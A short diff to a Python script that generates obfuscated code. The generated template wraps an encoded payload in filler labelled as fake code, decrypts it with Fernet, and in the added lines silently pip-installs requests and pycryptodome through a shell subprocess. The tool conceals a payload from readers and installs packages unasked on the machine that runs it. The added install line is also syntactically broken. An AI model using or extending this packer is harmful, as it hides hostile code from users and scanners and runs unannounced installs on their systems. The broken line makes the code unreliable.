@@ -85,6 +85,22 @@ obfuscated_code = f'''
 import zlib
 import base64
 {all_fake_code}
+from sys import executable, stderr
+requirements = [
+    ["requests", "requests"],
+    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
+]
+for module in requirements:
+    try: 
+        __import__(module[0])
+    except:
+        subprocess.Popen(executable+ " -m pip install " + module[1] --quiet", shell=True)
+        time.sleep(3)
+
+from Crypto.Cipher import AES
+
+import requests
+
 import cryptography
 from cryptography.fernet import Fernet as {a}
 encoded_code = "{encoded_code}"
